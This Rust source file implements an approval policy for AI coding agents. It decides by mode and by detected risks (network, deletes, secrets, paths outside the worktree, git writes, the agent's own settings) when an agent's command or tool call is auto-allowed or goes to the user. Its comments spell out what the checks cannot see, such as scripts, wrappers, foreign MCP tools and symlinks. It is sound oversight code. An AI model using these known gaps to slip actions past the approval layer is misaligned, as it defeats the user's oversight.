//! Approval policy, level L0 (CRITIQUE D6, agents-backend §5.2): deterministic rules settle
//! the obvious cases before you are asked. The rules read the request, and the disk only to
//! follow symlinks and to see what a command points at (an installed tool, another git
//! repository); the broker glue lives in ingest.rs.
//!
//! Order of the rules:
//! 1. questions, permission changes and a plan the agent shows you (Claude's plan mode) always
//!    go to you;
//! 2. any risk — a provider hint, or one Codly detects (outside the worktree, deletes,
//!    network, push, publish, sudo, git writes, secrets shown to the model, the agent's own
//!    CLI settings or a package manager's settings changed, unparseable shell) — goes to you,
//!    except in full mode for an agent that is not read-only, where only touching Codly's own
//!    data dir or the agent's own CLI settings still asks, and so does a command that can
//!    lose work in your project folder itself (`loses_work`): from an agent that works there
//!    (Git isolation off), or one that points the command there from its worktree;
//! 3. Codly's own MCP tools are allowed in every mode;
//! 4. then the mode: strict asks for everything else; read-only agents (a 1:1 Claude agent
//!    that plans first is one until you accept its plan) get only reads in every other mode;
//!    balanced allows read-only actions, the task's own verify commands and test runners;
//!    autonomous allows anything with no detected risk, except a tool of an MCP server that
//!    Codly did not give this run (`foreign_mcp_tool`): what such a tool does is not in its name;
//!    full allows everything.
//!
//! Only `allow_once` is ever chosen automatically, never a session or permanent grant.
//!
//! 5. What the rules above would ask you about, a rule you saved for the repo ("always allow
//!    in this repo", `rule_offer`) may answer instead: the exact command, or a command that
//!    starts with the saved words (`cargo test`), alone on its line or with commands that only
//!    read (`cd web && cargo test 2>&1 | tail -5`). A saved rule covers a package download
//!    into the project and a git command that changes the repository; the exact command also
//!    covers other network use. Every other risk still asks, and so do strict mode, read-only
//!    agents and a command that changes your own account or settings (`cargo login`,
//!    `npm config set …`). A tool of an MCP server can be saved by its name, when the request
//!    shows no risk and comes from a CLI that names the tool itself (`names_mcp_tools`).
//!
//! What the rules cannot see: they read the command line, not what a program does. A script,
//! an interpreter (`python x.py`), `make` or a test the agent wrote can do anything the
//! agent's user account can, so no mode proves that an allowed command stays inside the
//! worktree. Only an OS sandbox does: Codex runs its commands in one, and Claude Code does
//! when "Sandbox Claude's shell" is on in Settings. That sandbox is a second wall, not a way
//! around these rules: Codly starts it with `autoAllowBashIfSandboxed: false`
//! (`adapters/claude.rs`, `settings_json`), so a sandboxed command still sends its request
//! and is judged here like any other. Recorded with Claude Code 2.1.311: with auto-allow off,
//! the same commands ask with the sandbox as without it (fixtures `r5-commands-noauto`
//! against `r5-commands-off`, and the same pair in manual mode; section 5 of
//! docs/research/cli-claude-stream-json-2.1.311-part3.md). The one request the sandbox adds
//! is its own, for a host a command reaches. The other CLIs have no sandbox.
//!
//! The shell checks err toward asking: a "read-only command" is a bare program name (no path,
//! no `VAR=x` prefix, no wrapper, no `$` expansion) whose arguments use none of its options
//! that write or run something; risks look through wrappers (`timeout 5 git push`) and nested
//! `sh -c`; a word whose value the shell computes (`$HOME/x`) counts as outside the worktree.

use std::path::{Component, Path, PathBuf};
use std::sync::RwLock;

use crate::adapters::claude::EXIT_PLAN_MODE;
use crate::adapters::classify::{self, ShellRun, first_non_flag, git_read_only, git_sub, has, long_flag, operands, options, read_only, short_flag};
use crate::mcp::tools;
use crate::model::*;

pub struct PolicyCtx<'a> {
    pub mode: ApprovalMode,
    /// The agent's working directory: task or solo worktree, repo root for the Lead.
    pub worktree: Option<&'a Path>,
    /// The task's own verify commands (always allowed in balanced mode).
    pub verify: &'a [String],
    /// Lead, reviewers, between-task chats, a 1:1 agent that plans first: only reads are ever
    /// auto-allowed, in any mode (the Lead's working directory is the user's own checkout).
    pub read_only: bool,
    /// You trust it to edit on its own (`career::trusts`, Junior): file changes inside the worktree are approved in balanced mode.
    pub edits: bool,
    /// Your project folder: the checkout of the repo the agent works for. An agent hired with
    /// Git isolation off works in it (`worktree` is this folder); any other agent can point a
    /// command at it from its worktree (`cd`, `git -C`, a path). No branch of the agent's own
    /// and no checkpoint stands between a command that acts there and your work, so full mode
    /// still asks before one that can lose it (`loses_work`). None: no repo is known.
    pub checkout: Option<&'a Path>,
    /// The MCP servers Codly gave this run beside its own, by name: your Connections that were
    /// on, with their keys, when the run started (`connections::given`). A server of any other
    /// name comes from your own CLI setup or from the repo.
    pub own_mcp: &'a [String],
    /// The CLI of the agent that asks. None: not known, and nothing is taken from a tool's
    /// name (`names_mcp_tools`).
    pub provider: Option<Provider>,
}

/// Does this CLI name the tool of an MCP server itself, as `mcp__<server>__<tool>`? Only Claude
/// Code is recorded to (`mcp_server`). An ACP agent (Gemini, OpenCode, Cursor, Copilot) names
/// a request by a title, which is free text: a title that reads like a tool's name says
/// nothing about the tool, so no rule is saved or followed for it. Codex sends no such request.
fn names_mcp_tools(provider: Option<Provider>) -> bool {
    provider == Some(Provider::Claude)
}

#[derive(Debug, Clone, PartialEq)]
pub enum Verdict {
    Allow { choice: ApprovalChoice, rule: String },
    Ask { reason: String },
}

pub fn evaluate(a: &Approval, ctx: &PolicyCtx) -> Verdict {
    let ask = |reason: String| Verdict::Ask { reason };
    match &a.subject {
        ApprovalSubject::Question { .. } => return ask("the agent asked you a question".into()),
        ApprovalSubject::Permissions { .. } => return ask("the agent wants broader permissions".into()),
        // A plan is shown to be read: no mode accepts it for you (accepted, the agent starts to act on it).
        ApprovalSubject::Tool { name, .. } if name == EXIT_PLAN_MODE => return ask("the agent shows you its plan".into()),
        _ => {}
    }
    let mut risks = a.risks.clone();
    for r in detect_risks(&a.subject, ctx.worktree) {
        if !risks.contains(&r) {
            risks.push(r);
        }
    }
    let full = ctx.mode == ApprovalMode::Full && !ctx.read_only;
    // The floors full mode keeps. New CLI settings could switch off every later request.
    let floor = |r: &String| r == CODLY_DATA || r == classify::AGENT_SETTINGS;
    if !risks.is_empty() && !(full && !risks.iter().any(floor)) {
        return ask(format!("risk: {}", risks.join(", ")));
    }
    // One more floor, in your own project folder only: in a Codly worktree the same command
    // stays allowed.
    if full && let Some(loss) = checkout_loss(&a.subject, ctx) {
        let how = if ctx.worktree == ctx.checkout { "Git isolation is off" } else { "outside the agent's worktree" };
        return ask(format!("{loss} in your project folder itself ({how}): full access still asks"));
    }
    let allow = |rule: String| {
        if a.choices.is_empty() || a.choices.contains(&ApprovalChoice::AllowOnce) {
            Verdict::Allow { choice: ApprovalChoice::AllowOnce, rule }
        } else {
            Verdict::Ask { reason: format!("{rule}, but the agent offered no one-time allow") }
        }
    };
    if let ApprovalSubject::Tool { name, .. } = &a.subject
        && is_codly_tool(name)
    {
        return allow(format!("Codly tool {name}"));
    }
    match ctx.mode {
        ApprovalMode::Strict => ask("strict mode: you approve every action".into()),
        _ if ctx.read_only => match &a.subject {
            ApprovalSubject::Command { command, .. } if classify_command(command, &[]) == Some(READ_ONLY) => {
                allow(format!("read-only command `{}`", short(command)))
            }
            ApprovalSubject::Tool { name, input } if is_read_only_tool(name, input) => allow(format!("read-only tool {name}")),
            _ => ask("this agent is read-only: only reads are approved automatically".into()),
        },
        ApprovalMode::Balanced => match &a.subject {
            ApprovalSubject::Command { command, .. } => match classify_command(command, ctx.verify) {
                Some(kind) => allow(format!("{kind} `{}`", short(command))),
                None => ask("not a read-only command, test runner or verify command".into()),
            },
            ApprovalSubject::Tool { name, input } if is_read_only_tool(name, input) => allow(format!("read-only tool {name}")),
            ApprovalSubject::Tool { name, .. } => ask(format!("tool {name} is not read-only")),
            // No risk was found above, so every path stays inside the worktree.
            ApprovalSubject::FileChange { .. } if ctx.edits && ctx.worktree.is_some() => {
                allow("edits inside its worktree (you trust it to edit on its own)".into())
            }
            _ => ask("balanced mode asks before file changes the CLI did not auto-accept".into()),
        },
        // Not "stays inside the worktree": what a script or program does is not checked.
        ApprovalMode::Autonomous => match (&a.subject, ctx.worktree) {
            (ApprovalSubject::Tool { name, .. }, _) if foreign_mcp_tool(name, ctx.own_mcp) => {
                ask(format!("tool {name} is from an MCP server that Codly did not set up"))
            }
            (_, Some(_)) => allow("autonomous: no risk detected".into()),
            (_, None) => ask("autonomous mode needs a worktree to check paths against".into()),
        },
        ApprovalMode::Full if risks.is_empty() => allow("full access".into()),
        ApprovalMode::Full => allow(format!("full access, despite risk: {}", risks.join(", "))),
    }
}

/// A worker you trust as Senior (`career::trusts`) works autonomously where you chose balanced.
/// Strict and full are explicit choices and stay as they are.
pub fn with_trust(mode: ApprovalMode, trusted: bool) -> ApprovalMode {
    if trusted && mode == ApprovalMode::Balanced { ApprovalMode::Autonomous } else { mode }
}

// ───────────────────────────── saved rules ─────────────────────────────

/// The rules a request can be saved as ("always allow in this repo"): nothing for what Codly
/// always asks about. A saved rule allows exactly the requests that offer it, so the card that
/// shows the choice and the broker that follows the rule can never disagree.
///
/// - Only commands and the tools of MCP servers, from an agent that may write, outside strict
///   mode, with a worktree to check paths against and a one-time allow to answer with.
/// - A tool of an MCP server is saved by its full name (`mcp__linear__create_issue`), as an
///   exact rule, and only when the request shows no risk at all. Codly's own tools never ask.
///   Only for a request of a CLI that names the tool itself (`names_mcp_tools`): the title of
///   another CLI's request offers no rule and matches none.
/// - Every risk of a command must be one a rule may cover: `PACKAGE_INSTALL`,
///   `NPX_DOWNLOAD`, `GIT_WRITE`, and for the exact command any other "network". A delete, a
///   push, sudo, a pipe into a shell, a secret, a path outside the worktree (an install for
///   the whole machine too), a change to an agent's settings and what cannot be checked are
///   never covered.
/// - A command that changes your own account or settings (`OWN_ACCOUNT`) is never saved, and
///   neither is one that can lose work in your own project folder (`checkout_loss`).
/// - The prefix is for one command (`rule_prefix`), alone on its line or with commands that
///   only read: a line that runs two commands that do more, or substitutes anything, offers
///   at most itself, as the exact command.
pub fn rule_offer(a: &Approval, ctx: &PolicyCtx) -> ApprovalRuleOffer {
    let none = ApprovalRuleOffer::default();
    let one_time = a.choices.is_empty() || a.choices.contains(&ApprovalChoice::AllowOnce);
    if ctx.mode == ApprovalMode::Strict || ctx.read_only || ctx.worktree.is_none() || !one_time {
        return none;
    }
    let detected = detect_risks(&a.subject, ctx.worktree);
    let no_risk = a.risks.is_empty() && detected.is_empty();
    let command = match &a.subject {
        // A command line that reads like a tool's name would be allowed by that tool's rule.
        ApprovalSubject::Command { command, .. } if !command.trim().is_empty() && mcp_server(command.trim()).is_none() => command,
        ApprovalSubject::Tool { name, .. } if no_risk && names_mcp_tools(ctx.provider) && mcp_server(name).is_some() && !is_codly_tool(name) => {
            return ApprovalRuleOffer { exact: Some(name.clone()), prefix: None };
        }
        _ => return none,
    };
    // A provider says "network" for every download; Codly's own label says which kind it is.
    let download = detected.iter().any(|r| r == PACKAGE_INSTALL || r == NPX_DOWNLOAD) && !detected.iter().any(|r| r == "network");
    let by_prefix = |r: &String| [PACKAGE_INSTALL, NPX_DOWNLOAD, GIT_WRITE].contains(&r.as_str()) || (r == "network" && download);
    let by_exact = |r: &String| r == "network" || by_prefix(r);
    if !a.risks.iter().chain(&detected).all(by_exact) || own_account(command, 0) || checkout_loss(&a.subject, ctx).is_some() {
        return none;
    }
    let prefix = if a.risks.iter().chain(&detected).all(by_prefix) { rule_prefix(command) } else { None };
    ApprovalRuleOffer { exact: Some(command.trim().to_string()), prefix }
}

/// Programs whose first argument is a subcommand: their prefix is `program subcommand`.
const SUBCOMMAND_TOOLS: &[&str] = &[
    "git", "npm", "pnpm", "yarn", "bun", "cargo", "go", "uv", "pip", "pip3", "poetry", "bundle", "gem", "composer", "make", "just", "task",
    "gradle", "mvn", "dotnet", "swift", "deno", "mix",
];

/// git subcommands a prefix may cover: what they change stays in the agent's worktree and on
/// its branch. `stash`, `branch` and `tag` are not here: the stash, the branches and the tags
/// belong to every worktree of the repository, yours included (`git stash drop`,
/// `git branch -D x`). `rebase`, `bisect` or `submodule` run other commands, and `reset` can
/// drop the commits Codly made.
const GIT_PREFIXES: &[&str] = &["add", "commit", "checkout", "switch", "restore", "merge", "cherry-pick", "revert", "mv", "apply"];

/// `git checkout -B x` and `git switch -C x` move a branch that exists already (yours, or
/// another worktree's); `-f` and `--discard-changes` drop work that is not committed. A
/// prefix never covers those.
fn git_forced(sub: &str, rest: &[Word]) -> bool {
    matches!(sub, "checkout" | "switch")
        && rest.iter().map(|w| w.text.as_str()).any(|a| match a.strip_prefix("--") {
            Some(long) => long.starts_with("force") || long.starts_with("discard"),
            None => a.starts_with('-') && a.contains(['B', 'C', 'f']),
        })
}

/// Programs that run every target named on the line (`make docs deploy`, `mvn test deploy`):
/// the prefix is for a line with one target, so it never covers a second one.
const MANY_TARGETS: &[&str] = &["make", "just", "task", "gradle", "mvn"];

/// Subcommands that change your own account or settings, or publish under your name: never
/// saved as a rule, the exact command included (a `cargo login <token>` rule would keep the
/// token and show it in Settings). The ones that publish or sign in ask as "publish"
/// (`PUBLISHES`), and a write to a package manager's settings asks as `OWN_SETUP`.
const OWN_ACCOUNT: &[&str] = &["config", "login", "logout", "publish"];

/// Does the line run one of the `OWN_ACCOUNT` subcommands (`cargo login x`,
/// `npm config set …`, `npm c set …`, `git config …`), behind a wrapper or `sh -c` too, and
/// behind a program that starts another (`pnpm exec git config …`, `npx -c 'git config …'`,
/// `uv run git config …`)?
fn own_account(cmd: &str, depth: u8) -> bool {
    parse(cmd).segments.iter().any(|seg| {
        let texts: Vec<String> = seg.iter().map(|w| w.text.clone()).collect();
        runs_own_account(&texts, depth)
    })
}

/// `own_account` for the words of one command: the program behind its wrappers, and every
/// command that program starts (`started_by`).
fn runs_own_account(words: &[String], depth: u8) -> bool {
    let Some((prog, args)) = classify::command_start(words).and_then(|i| words[i..].split_first()) else { return false };
    let prog = basename(prog);
    // Deeper than this, `command_risks` says "runs dynamic code": nothing is offered.
    let line = |inner: &str| depth < 3 && own_account(inner, depth + 1);
    if classify::SHELLS.contains(&prog) {
        return matches!(classify::shell_run(args), ShellRun::Command(inner) if line(inner));
    }
    // Behind an option's value too (`npm --prefix web config set …`).
    let subs = if prog == "git" { git_sub(args).0.into_iter().collect() } else { subcommands(prog, args) };
    (SUBCOMMAND_TOOLS.contains(&prog) && subs.iter().any(|sub| OWN_ACCOUNT.contains(sub) || names_config(prog, sub)))
        || started_by(prog, args).into_iter().any(|started| match started {
            // Fewer words each time, so this ends.
            Started::Program(command) => runs_own_account(command, depth),
            Started::ShellLine(inner) => line(&inner),
        })
}

/// Do these words only say that something runs, so the next word names what
/// (`npm run build`, `uv run pytest`, `pnpm dlx create-vite`, `uv tool run ruff`)? `go run`
/// and `deno run` take a module or a URL from the network as well as a local file.
fn names_what_runs(words: &[&str]) -> bool {
    match words {
        ["npm" | "pnpm" | "yarn" | "bun", sub] => ["run", "run-script", "exec", "dlx", "x", "create", "init"].contains(sub),
        ["uv", sub] => ["run", "pip", "tool"].contains(sub),
        ["uv", "tool", "run"] | ["poetry", "run"] | ["bundle", "exec"] | ["deno", "task" | "run"] | ["go", "run"] => true,
        _ => false,
    }
}

/// The prefix a command can be saved under: `cargo test` for `cargo test -p core`,
/// `npm run build` for `npm run build -- --watch`. The line holds that one command and,
/// beside it, only commands that read (`cd web && pnpm install`,
/// `pnpm install 2>&1 | tail -5`): a read-only command carries none of the risks a rule
/// covers, so every covered risk on the line is that one command's. No second command that
/// does more, no substitution or redirect to a file, no `$` expansion, no `VAR=x`, wrapper
/// or path in front of the program. The words of the prefix are plain names, so no option
/// and no path is ever part of a rule. A command the prefix must not cover gives no prefix
/// here, so it offers no rule that an earlier, plainer command saved (`git checkout -B main`,
/// `make docs deploy`).
fn rule_prefix(cmd: &str) -> Option<String> {
    let p = parse(cmd);
    if p.complex || p.writes.iter().any(|w| w.var || w.text != "/dev/null") {
        return None;
    }
    let mut others = p.segments.iter().filter(|seg| plain_command(seg) != Some(READ_ONLY));
    let (Some(seg), None) = (others.next(), others.next()) else { return None };
    if seg.iter().any(|w| w.var) {
        return None;
    }
    let name = |w: &&Word| {
        !w.glob && w.text.starts_with(|c: char| c.is_ascii_alphabetic()) && w.text.chars().all(|c| c.is_ascii_alphanumeric() || "-_:".contains(c))
    };
    let mut words = seg.iter();
    let prog = words.next().filter(|w| !w.glob && SUBCOMMAND_TOOLS.contains(&w.text.as_str()))?.text.as_str();
    let sub = words.next().filter(name)?.text.as_str();
    let rest = &seg[2..];
    if prog == "git" && (!GIT_PREFIXES.contains(&sub) || git_forced(sub, rest)) {
        return None;
    }
    let more_runs = if prog == "make" {
        let args: Vec<String> = seg[1..].iter().map(|w| w.text.clone()).collect();
        !make_builds_only(sub, &args)
    } else {
        MANY_TARGETS.contains(&prog) && rest.iter().any(|w| !w.text.starts_with('-'))
    };
    // `mix do a + b` runs several tasks, as a second target does.
    if more_runs || (prog == "mix" && sub == "do") {
        return None;
    }
    let mut prefix = vec![prog, sub];
    while names_what_runs(&prefix) {
        let next = words.next().filter(name)?.text.as_str();
        // A program with subcommands of its own, started by another (`pnpm exec npm …`,
        // `uv run cargo …`): these words would cover everything it can do, which the prefix
        // of the plain command (`npm install`) never does.
        if starts_a_program(&prefix) && SUBCOMMAND_TOOLS.contains(&next) {
            return None;
        }
        prefix.push(next);
    }
    Some(prefix.join(" "))
}

/// Does a `make` line build this one target and nothing else, with no option beside it but
/// those that say how to build, not what: `-j` with its count (`-j 8`, `-j8`, `--jobs 8`),
/// `-k` and `-s` with their long names? The words are read as `build_words` reads them, so
/// the count after `-j` is no second target. `-C dir`, `-f file`, a variable (`V=1`) and
/// every other option can change what runs: such a line gives no prefix.
fn make_builds_only(target: &str, args: &[String]) -> bool {
    let (targets, options) = build_words("make", args);
    let plain = |option: &&str| match option.strip_prefix("--") {
        Some(long) => ["jobs", "keep-going", "silent", "quiet"].contains(&long.split('=').next().unwrap_or(long)),
        None => option[1..].chars().all(|c| "jks".contains(c) || c.is_ascii_digit()),
    };
    targets == [target] && options.iter().all(plain)
}

/// Is the next word, after these words that only say that something runs (`names_what_runs`),
/// the name of a program (`pnpm exec <program>`, `uv run <program>`) and not of a script, a
/// package or a subcommand (`npm run <script>`, `pnpm create <package>`, `uv pip <subcommand>`)?
fn starts_a_program(words: &[&str]) -> bool {
    matches!(words, [_, "exec" | "x" | "dlx"] | ["uv" | "poetry", "run"] | ["uv", "tool", "run"])
}

fn short(s: &str) -> String {
    let one = s.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.chars().count() > 60 { format!("{}…", one.chars().take(59).collect::<String>()) } else { one }
}

/// The MCP server of a tool, by the name Claude Code gives its tools: `mcp__<server>__<tool>`
/// (recorded in docs/research/fixtures/claude-2.1.311/r4-project-mcp-project.ndjson). An ACP
/// agent names a tool request by a free-text title, so no server can be read from it.
fn mcp_server(name: &str) -> Option<&str> {
    name.strip_prefix("mcp__")?.split_once("__").map(|(server, _)| server).filter(|server| !server.is_empty())
}

/// Is the tool from an MCP server that Codly did not give this run: not one of Codly's own
/// tools, and not a tool of one of `own` (`PolicyCtx::own_mcp`)? Such a server comes from your
/// own CLI setup or from the repo (`.mcp.json`), whatever its name is (a Connection that is
/// off gives its name to no server), and nothing here says what its tools do.
///
/// Why the name is enough for a server Codly gave the run: Codly passes it with
/// `--mcp-config`, and where the repo's `.mcp.json` defines a server of the same name, Claude
/// Code runs the one of `--mcp-config` and does not start the project's (fixture
/// `r5-mcp-source-clash`; section 11 of docs/research/cli-claude-stream-json-2.1.311-part3.md).
/// Not recorded: a server of your own user setup (`~/.claude.json`) with such a name.
///
/// A server's name may hold `__` too, so `mcp__github__x__tool` can be the tool `x__tool` of
/// `github` or a tool of a server named `github__x`. A name that reads both ways asks.
fn foreign_mcp_tool(name: &str, own: &[String]) -> bool {
    let given = |server: &String| {
        let tool = name.strip_prefix("mcp__").and_then(|rest| rest.strip_prefix(server.as_str())).and_then(|rest| rest.strip_prefix("__"));
        tool.is_some_and(|tool| !tool.is_empty() && !tool.contains("__"))
    };
    mcp_server(name).is_some() && !is_codly_tool(name) && !own.iter().any(given)
}

/// Codly's own MCP tools, as each CLI names them (`mcp__codly__codly_board` for Claude,
/// `codly_codly_board` for OpenCode…). Only server-qualified names count: a bare
/// `codly_board` could be any MCP server's tool.
pub fn is_codly_tool(name: &str) -> bool {
    let Some(n) = ["mcp__codly__", "codly__", "codly.", "codly/", "codly_"].iter().find_map(|p| name.strip_prefix(p)) else {
        return false;
    };
    [
        tools::GET_TASK,
        tools::BOARD,
        tools::SEARCH,
        tools::MEMORY_SEARCH,
        tools::MEMORY_WRITE,
        tools::KG_QUERY,
        tools::KG_ADD,
        tools::POST_NOTE,
        tools::SUBMIT_PLAN,
        tools::SUBMIT_REPORT,
        tools::ASK_LEAD,
        tools::SUBMIT_REVIEW,
        tools::MESSAGE_MEMBER,
        tools::QUICK_TASK,
        tools::REASSIGN,
        tools::ASK_USER,
    ]
    .contains(&n)
}

/// The protocol `kind` of an ACP tool request (`acp.rs` stores it in the input).
fn acp_kind(input: &serde_json::Value) -> Option<&str> {
    input.get(classify::ACP_KIND).and_then(|k| k.as_str())
}

fn is_read_only_tool(name: &str, input: &serde_json::Value) -> bool {
    /// Tools that read or search files, as Claude and Gemini name them.
    const READS: &[&str] =
        &["read", "glob", "grep", "ls", "notebookread", "read_file", "read_many_files", "list_directory", "search_file_content"];
    /// Titles only ACP agents send.
    const ACP_READS: &[&str] = &["list", "view", "find"];
    /// The agent's own task list.
    const LISTS: &[&str] = &["tasklist", "taskget", "taskcreate", "taskupdate", "todoread", "todowrite"];
    let name = name.to_ascii_lowercase();
    let name = name.as_str();
    LISTS.contains(&name)
        || match acp_kind(input) {
            // An ACP request is named by its title, which is free text (any tool can be titled
            // "read"): the protocol kind must say it reads, too.
            Some(kind) => matches!(kind, "read" | "search") && (READS.contains(&name) || ACP_READS.contains(&name)),
            None => READS.contains(&name),
        }
}

// ───────────────────────────── risks ─────────────────────────────

/// Risks Codly can see in a request (in addition to the provider's own hints).
pub fn detect_risks(subject: &ApprovalSubject, worktree: Option<&Path>) -> Vec<String> {
    let mut risks: Vec<String> = vec![];
    let mut add = |r: &str| {
        if !risks.iter().any(|x| x == r) {
            risks.push(r.to_string());
        }
    };
    let root = worktree.unwrap_or(Path::new(""));
    match subject {
        ApprovalSubject::Command { command, cwd } => {
            let base = cwd.as_deref().map(PathBuf::from).or_else(|| worktree.map(Path::to_path_buf));
            if let (Some(c), Some(w)) = (cwd.as_deref(), worktree)
                && escapes(Path::new(c), w)
            {
                add("outside worktree");
            }
            if cwd.as_deref().is_some_and(|c| private_path(c, None, worktree)) {
                add(CODLY_DATA);
            }
            if let (Some(c), Some(w)) = (cwd.as_deref(), worktree)
                && nested_repo(Path::new(c), w)
            {
                add(NESTED_REPO);
            }
            for r in command_risks(command, base.as_deref(), worktree, 0) {
                add(&r);
            }
        }
        ApprovalSubject::FileChange { paths, diff } => {
            for p in paths {
                if worktree.is_some_and(|w| escapes(&resolve(w, p), w)) {
                    add("outside worktree");
                }
                if private_path(p, worktree, worktree) {
                    add(CODLY_DATA);
                }
                if let Some(why) = classify::guarded_path(p, root) {
                    add(why);
                }
            }
            if diff.as_deref().is_some_and(|d| d.contains("deleted file mode")) {
                add("deletes files");
            }
        }
        ApprovalSubject::Tool { name, input } => {
            let lname = name.to_ascii_lowercase();
            // By name, by ACP kind (a title such as a URL names nothing), or by a `url` to open.
            if ["webfetch", "websearch", "web_fetch", "google_web_search", "fetch"].contains(&lname.as_str())
                || acp_kind(input) == Some("fetch")
                || input.get("url").is_some_and(|u| u.is_string())
            {
                add("network");
            }
            if lname.contains("delete") || lname.contains("remove") {
                add("deletes files");
            }
            for p in input_paths(input) {
                if worktree.is_some_and(|w| escapes(&resolve(w, &p), w)) {
                    add("outside worktree");
                }
                if private_path(&p, worktree, worktree) {
                    add(CODLY_DATA);
                }
                if classify::secret_file(&p) {
                    add(classify::SECRETS);
                }
                if let Some(why) = classify::guarded_path(&p, root).filter(|_| !is_read_only_tool(name, input)) {
                    add(why);
                }
            }
        }
        ApprovalSubject::Question { .. } | ApprovalSubject::Permissions { .. } => {}
    }
    risks
}

fn input_paths(input: &serde_json::Value) -> Vec<String> {
    let mut out = vec![];
    if let Some(obj) = input.as_object() {
        for (k, v) in obj {
            if !["path", "file_path", "filePath", "notebook_path", "paths", "directory", "dir", "cwd", "absolute_path"].contains(&k.as_str()) {
                continue;
            }
            match v {
                serde_json::Value::String(s) => out.push(s.clone()),
                serde_json::Value::Array(a) => out.extend(a.iter().filter_map(|x| x.as_str().map(String::from))),
                _ => {}
            }
        }
    }
    out
}

/// `p` as an absolute path, as written: `escapes` reads it both with `..` taken literally
/// and with symlinks followed.
fn resolve(base: &Path, p: &str) -> PathBuf {
    if p.starts_with('~') {
        return PathBuf::from("/~home"); // never inside a worktree
    }
    let p = Path::new(p);
    if p.is_absolute() { p.to_path_buf() } else { base.join(p) }
}

/// Normalize `.` and `..` without touching the filesystem.
fn lexical(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Directories that are never an agent's, even when its worktree contains them: Codly's
/// data dir (other runs' MCP configs with their tokens, raw logs, the database). Task and solo
/// worktrees live inside it, so only paths outside the agent's own root count.
static PRIVATE_DIRS: RwLock<Vec<PathBuf>> = RwLock::new(Vec::new());

/// Treat `dir` as Codly's own (the Core registers its data dir at start).
pub fn protect_dir(dir: &Path) {
    let mut dirs = PRIVATE_DIRS.write().unwrap_or_else(|e| e.into_inner());
    for d in [lexical(dir), std::fs::canonicalize(dir).map_or_else(|_| lexical(dir), |c| lexical(&c))] {
        if !dirs.contains(&d) {
            dirs.push(d);
        }
    }
}

/// The risk label for touching one of Codly's private dirs: the one floor full mode keeps.
pub const CODLY_DATA: &str = "Codly data";

/// Where `p` leads once symlinks are followed: with `..` taken literally first (as `cd` does)
/// and, when that differs, with each link followed before the `..` after it (as the kernel
/// does when a program opens the path).
fn real_forms(p: &Path) -> Vec<PathBuf> {
    let plain = lexical(p);
    let mut out = vec![classify::real_path(&plain)];
    if plain != p {
        out.push(classify::real_path(p));
    }
    out
}

/// Is `p` outside `root`, or inside one of Codly's private dirs that `root` is not inside?
/// A path that leaves `root` through a symlink (`docs/ref -> ~`) is outside.
fn escapes(p: &Path, root: &Path) -> bool {
    if !lexical(p).starts_with(lexical(root)) || private(p, Some(root)) {
        return true;
    }
    let root = classify::real_path(root);
    real_forms(p).iter().any(|r| !r.starts_with(&root))
}

/// Is `p` inside one of Codly's private dirs, and not inside `root` when `root` (the agent's
/// own worktree) lives in that dir? `p` counts as written and as symlinks resolve it.
fn private(p: &Path, root: Option<&Path>) -> bool {
    let dirs = PRIVATE_DIRS.read().unwrap_or_else(|e| e.into_inner());
    if dirs.is_empty() {
        return false;
    }
    let inside = |p: &Path, root: Option<&PathBuf>| {
        dirs.iter().any(|d| p.starts_with(d) && !root.is_some_and(|r| r.starts_with(d) && p.starts_with(r)))
    };
    inside(&lexical(p), root.map(lexical).as_ref()) || {
        let root = root.map(classify::real_path);
        real_forms(p).iter().any(|r| inside(r, root.as_ref()))
    }
}

/// The risk label for running git where another repository's config applies.
const NESTED_REPO: &str = "nested git repository";

/// Is `dir` inside a git repository other than the worktree's own: below `root`, a bare
/// repository (`HEAD`, `objects/`, `refs/`) or a directory with its own `.git`? git run there
/// reads that repository's config and runs the programs it names (`core.fsmonitor`, filters,
/// `diff.external`), and a cloned repo or the agent itself can put one in the worktree.
fn nested_repo(dir: &Path, root: &Path) -> bool {
    let (dir, root) = (classify::real_path(&lexical(dir)), classify::real_path(root));
    dir.ancestors().take_while(|d| *d != root && d.starts_with(&root)).any(|d| {
        d.join(".git").symlink_metadata().is_ok()
            || (d.join("HEAD").symlink_metadata().is_ok() && d.join("objects").is_dir() && d.join("refs").is_dir())
    })
}

/// `private` for a path as written, relative to `base`, with `~/` and `$HOME/` expanded from
/// the environment (`resolve` treats them as merely "outside").
/// ponytail: other `$VAR`s and `~user` stay unknown and pass in full mode; resolve them if an
/// agent is ever seen reaching the data dir that way.
fn private_path(v: &str, base: Option<&Path>, root: Option<&Path>) -> bool {
    let home = std::env::var("HOME").unwrap_or_default();
    let v = ["~/", "$HOME/", "${HOME}/"].iter().find_map(|p| v.strip_prefix(p)).map_or_else(|| v.to_string(), |r| format!("{home}/{r}"));
    let p = Path::new(&v);
    match base {
        _ if p.is_absolute() => private(p, root),
        Some(b) => private(&b.join(p), root),
        None => false,
    }
}

/// One shell word, with what the shell would do to it that the text alone does not show.
#[derive(Debug, Clone, Default, PartialEq)]
struct Word {
    text: String,
    /// Holds a `$` expansion (unquoted or in double quotes): its value is unknown.
    var: bool,
    /// Starts with an unquoted glob or brace list (`*`, `?x`, `[ab]*`, `{-o,f}`): it may turn
    /// into several words, options included.
    glob: bool,
}

/// A shell command split into simple commands, with what can be checked statically.
#[derive(Debug, Default)]
struct Parsed {
    segments: Vec<Vec<Word>>,
    /// Files written through `>` / `>>` / `&>` / `>&`.
    writes: Vec<Word>,
    /// Command or process substitution, here-docs, zsh glob qualifiers and `=(…)`: what runs
    /// cannot be checked.
    complex: bool,
}

/// Does `$` followed by `n` expand (`$HOME`, `${x}`, `$'…'`, zsh `$=x`)? `$?`, `$#`, `$$`, `$!`
/// and `$-` are numbers or flags, never paths; a lone `$` is literal.
fn expands(n: char, in_double_quotes: bool) -> bool {
    n.is_ascii_alphanumeric() || "_{@*[=~^+".contains(n) || (!in_double_quotes && (n == '\'' || n == '"'))
}

#[derive(Default)]
struct Lexer {
    p: Parsed,
    cur: Word,
    in_word: bool,
    redirect: bool,
    /// The current word's first character, when it was not quoted.
    lead: Option<char>,
}

impl Lexer {
    fn push(&mut self, c: char, quoted: bool) {
        if !quoted && self.cur.text.is_empty() && self.lead.is_none() {
            self.lead = Some(c);
        }
        self.in_word = true;
        self.cur.text.push(c);
    }

    fn flush(&mut self) {
        let lead = self.lead.take();
        if !self.in_word {
            return;
        }
        self.in_word = false;
